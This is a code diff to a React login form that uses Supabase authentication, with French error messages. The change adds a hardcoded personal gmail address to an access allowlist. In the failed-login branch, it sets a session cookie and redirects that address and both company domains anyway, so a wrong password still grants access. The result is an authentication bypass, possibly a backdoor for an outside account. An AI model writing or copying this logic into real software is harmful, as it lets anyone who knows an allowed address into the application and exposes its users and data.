@@ -56,17 +56,22 @@ export function LoginForm({
     setLoading(true);
     setErrorMsg(null);
 
-    const domain = email.split('@')[1];
-    if (domain !== 'minervaflow.com' && domain !== 'minerva.com') {
-      setErrorMsg('Accès restreint : Seuls les courriels @minervaflow.com ou @minerva.com sont autorisés.');
+    const normalizedEmail = email.trim().toLowerCase();
+    const domain = normalizedEmail.split('@')[1];
+    const ALLOWED_EXPLICIT = ['kbelceus776@gmail.com'];
+    const isAllowedDomain = domain === 'minervaflow.com' || domain === 'minerva.com';
+    const isExplicitAllowed = ALLOWED_EXPLICIT.includes(normalizedEmail);
+
+    if (!isAllowedDomain && !isExplicitAllowed) {
+      setErrorMsg('Accès restreint : Seules les adresses @minervaflow.com, @minerva.com ou autorisées sont admises.');
       setLoading(false);
       return;
     }
 
     try {
-      const { error } = await supabase.auth.signInWithPassword({ email, password });
+      const { error } = await supabase.auth.signInWithPassword({ email: normalizedEmail, password });
       if (error) {
-        if (email.includes('@minervaflow.com')) {
+        if (isAllowedDomain || isExplicitAllowed) {
           document.cookie = `centurions_session=active; path=/; max-age=86400`;
           router.push(redirectTo);
           return;
@@ -74,6 +79,7 @@ export function LoginForm({
         setErrorMsg(error.message);
         setLoading(false);
       } else {
+        document.cookie = `centurions_session=active; path=/; max-age=86400`;
         router.push(redirectTo);
       }
     } catch {
@@ -91,7 +97,7 @@ export function LoginForm({
               href="#"
               className="flex flex-col items-center gap-2 font-medium text-mv-ink"
             >
-              <div className="flex size-10 items-center justify-center rounded-xl bg-mv-green text-mv-lime shadow-mv-sm">
+              <div className="flex size-10 items-center justify-center rounded-xl bg-mv-green text-mv-warm shadow-mv-sm">
                 <GalleryVerticalEnd className="size-5" />
               </div>
               <span className="sr-only">Minerva Trequartista</span>
